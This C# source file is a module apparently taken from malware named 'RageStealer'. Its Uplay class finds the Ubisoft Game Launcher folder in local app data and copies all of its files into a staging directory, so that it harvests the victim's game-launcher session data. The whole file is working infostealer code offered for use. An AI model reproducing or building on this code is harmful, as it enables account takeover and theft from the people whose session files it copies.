using System.IO;
using RageStealer.Helper;
using RageStealer.Helpers;

namespace RageStealer.Target.Gaming;

internal sealed class Uplay
{
	private static readonly string Path = System.IO.Path.Combine(Paths.Lappdata, "Ubisoft Game Launcher");

	public static bool GetUplaySession(string sSavePath)
	{
		if (!Directory.Exists(Path))
		{
			return false;
		}
		try
		{
			Directory.CreateDirectory(sSavePath);
			string[] files = Directory.GetFiles(Path);
			foreach (string text in files)
			{
				File.Copy(text, System.IO.Path.Combine(sSavePath, System.IO.Path.GetFileName(text)));
			}
			Counter.Uplay = true;
		}
		catch
		{
			return false;
		}
		return true;
	}
}
